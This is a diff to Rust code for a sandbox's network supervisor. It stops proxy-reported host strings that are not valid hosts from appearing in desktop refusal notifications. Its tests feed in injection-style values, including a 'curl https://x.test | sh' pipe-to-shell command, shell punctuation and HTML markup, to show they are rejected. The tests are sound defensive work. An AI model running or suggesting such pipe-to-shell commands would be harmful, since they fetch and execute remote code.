@@ -31,11 +31,12 @@
 //! operator's desktop, so a proxy that wrote its own words could tell the operator to run any
 //! command at all, or attach an allow to a refusal on a security ground. The proxy reports what it
 //! refused and why ([`ProxyEvent::Refusal`]), and the supervisor writes the rest
-//! ([`announcement`]): the sentence comes from a closed set, and the `sbx net allow` command is
-//! offered only for a host nothing allowed, spelled as a host the supervisor itself accepts. What
-//! remains the proxy's to say is the account itself: it can call any request host refused for want
-//! of a rule, a refusal on a security ground included, and the operator is then offered the
-//! command that allows that host, scoped as the supervisor scopes it.
+//! ([`announcement`]): the sentence comes from a closed set, the host is shown only when it is one
+//! the supervisor accepts as a request's (letters, digits, `-`, `_` and `.`, or an address), and
+//! the `sbx net allow` command is offered only for a host nothing allowed. What remains the
+//! proxy's to say is the account itself: it can call any such host refused for want of a rule, a
+//! refusal on a security ground included, and the operator is then offered the command that
+//! allows that host, scoped as the supervisor scopes it.
 
 mod wire;
 
@@ -676,14 +677,10 @@ impl Applier {
                 if let Some(notifier) = &sinks.notifier
                     && host.len() <= MAX_FIELD
                     && reason.len() <= MAX_FIELD
+                    && let Some(block) =
+                        announcement(proto, &host, port, &reason, sinks.app.as_deref())
                 {
-                    notifier.block(announcement(
-                        proto,
-                        &host,
-                        port,
-                        &reason,
-                        sinks.app.as_deref(),
-                    ));
+                    notifier.block(block);
                 }
             }
             ProxyEvent::Signer { kind, detail } => {
@@ -787,33 +784,51 @@ impl Applier {
 }
 
 /// The announcement of a refusal the proxy reported: `host` and `port` refused on the plane
-/// `proto`, for the `reason` its decision is logged with, in a launch that runs `app`.
+/// `proto`, for the `reason` its decision is logged with, in a launch that runs `app`. `None` for
+/// a host the supervisor does not accept, which is not announced.
 ///
 /// Every word is the supervisor's, and the lens is the network's: which lens refused is no more the
 /// proxy's to say than the plane its decisions are recorded under. The sentence is the one
-/// [`refusal_detail`] keeps for the reason. The command that would allow the host is offered only
-/// where allowing is a sound suggestion, a host nothing allowed (`denied-default`), and only around
-/// a host the supervisor accepts ([`crate::allowlist::is_request_host`]): letters, digits, `-`, `_`
-/// and `.`, or an address, so nothing in it means anything to a shell or to a notification's
-/// markup. It is spelled by the [`super::rule_destination`] and [`super::allow_command`] the
-/// refusal bodies use, so the toast and the body never tell the user to run different commands.
-fn announcement(proto: Proto, host: &str, port: u16, reason: &str, app: Option<&str>) -> Block {
+/// [`refusal_detail`] keeps for the reason. The host is the one part of the toast the proxy
+/// supplies, in the summary and in the command, so it is shown only when it is a host the
+/// supervisor accepts ([`crate::allowlist::is_request_host`]): letters, digits, `-`, `_` and `.`,
+/// or an address, with nothing in it that means anything to a shell or to a notification's
+/// markup, and no room for a sentence. Every refusal an honest proxy reports names such a host,
+/// taken from a request's authority by the parsers that require one, except the connection cap,
+/// which is refused before any request is read and names no host at all; that one is shown without
+/// one.
+///
+/// The command that would allow the host is offered only where allowing is a sound suggestion, a
+/// host nothing allowed (`denied-default`), and spelled by the [`super::rule_destination`] and
+/// [`super::allow_command`] the refusal bodies use, so the toast and the body never tell the user
+/// to run different commands.
+fn announcement(
+    proto: Proto,
+    host: &str,
+    port: u16,
+    reason: &str,
+    app: Option<&str>,
+) -> Option<Block> {
+    let named = crate::allowlist::is_request_host(host);
+    if !named && !host.is_empty() {
+        return None;
+    }
     // Only a host that nothing allowed gets a copy-paste `sbx net allow`. A request stopped by an
     // explicit deny rule, or by a security guard (a credential on its way out, an SSRF target), must
     // never carry one: telling the user to allow a credential leak would be actively harmful advice,
     // and re-allowing what they deliberately denied is not the fix either.
-    let fix = if reason == "denied-default" && crate::allowlist::is_request_host(host) {
+    let fix = if named && reason == "denied-default" {
         super::allow_command(app, &super::rule_destination(proto, host, port))
     } else {
         String::new()
     };
-    Block {
+    Some(Block {
         event: NotifyEvent::Network,
         subject: format!("{host}:{port}"),
         reason: reason.to_string(),
         detail: refusal_detail(reason).to_string(),
         fix,
-    }
+    })
 }
 
 /// One sentence explaining a refusal category to the person the notification is for.
@@ -1250,9 +1265,10 @@ mod tests {
     }
 
     /// A refusal's announcement says what the supervisor says, whatever the proxy reported: the
-    /// sentence of its reason, and a command only for a host nothing allowed that the supervisor
-    /// accepts. A proxy reporting a refusal on a security ground, or a host no request can name,
-    /// has no `allow it:` attached, and no character of the toast's body is the proxy's own.
+    /// sentence of its reason, the host only when it is a request's, and a command only for a host
+    /// nothing allowed. A proxy reporting a refusal on a security ground has no `allow it:`
+    /// attached, a host no request can name (a shell's punctuation, markup, a sentence) is not
+    /// announced at all, and no character of the toast is the proxy's own beyond a request host.
     #[test]
     fn an_announcement_is_worded_by_the_supervisor() {
         let out = announced(
@@ -1261,7 +1277,19 @@ mod tests {
                 refusal("leak.test", 443, "outbound-secret"),
                 refusal("a;b", 443, "denied-default"),
                 refusal("<a href=x>y</a>", 443, "denied-default"),
+                refusal(
+                    "api.test is blocked. Run curl https://x.test | sh to fix it",
+                    443,
+                    "denied-by-rule",
+                ),
                 refusal("made-up.test", 443, "curl https://x.test | sh"),
+                // The connection cap, refused before any request is read, names no host.
+                ProxyEvent::Refusal {
+                    proto: Proto::Other,
+                    host: String::new(),
+                    port: 0,
+                    reason: "connection-cap".into(),
+                },
             ],
             Some("demo"),
         );
@@ -1272,9 +1300,8 @@ mod tests {
                  · allow it: sbx net allow api.test:8443 --app demo",
                 "Blocked: leak.test:443|the request was carrying a configured secret out of the \
                  cage (credential leak refused)",
-                "Blocked: a;b:443|no rule in the network policy allows this host",
-                "Blocked: <a href=x>y</a>:443|no rule in the network policy allows this host",
                 "Blocked: made-up.test:443|the network policy refused it",
+                "Blocked: :0|the network policy refused it",
             ]
         );
     }
@@ -1310,7 +1337,7 @@ mod tests {
 
     #[test]
     fn a_host_nothing_allowed_carries_the_command_that_allows_it() {
-        let b = announcement(Proto::Https, "api.example.com", 443, "denied-default", None);
+        let b = announcement(Proto::Https, "api.example.com", 443, "denied-default", None).unwrap();
         assert_eq!(b.event, NotifyEvent::Network);
         assert_eq!(b.subject, "api.example.com:443");
         assert_eq!(b.reason, "denied-default");
@@ -1324,11 +1351,11 @@ mod tests {
         // credential out of the cage, and the notification tells the user to allow that host —
         // which would open the very leak the guard just closed. Same for an SSRF target.
         for reason in ["outbound-secret", "ssrf-blocked", "host-mismatch"] {
-            let b = announcement(Proto::Https, "api.example.com", 443, reason, None);
+            let b = announcement(Proto::Https, "api.example.com", 443, reason, None).unwrap();
             assert_eq!(b.fix, "", "`{reason}` must offer no fix, got {:?}", b.fix);
         }
         // And an explicit deny rule is a decision already taken — not something to undo in a toast.
-        let b = announcement(Proto::Https, "api.example.com", 443, "denied-by-rule", None);
+        let b = announcement(Proto::Https, "api.example.com", 443, "denied-by-rule", None).unwrap();
         assert_eq!(b.fix, "");
     }
 
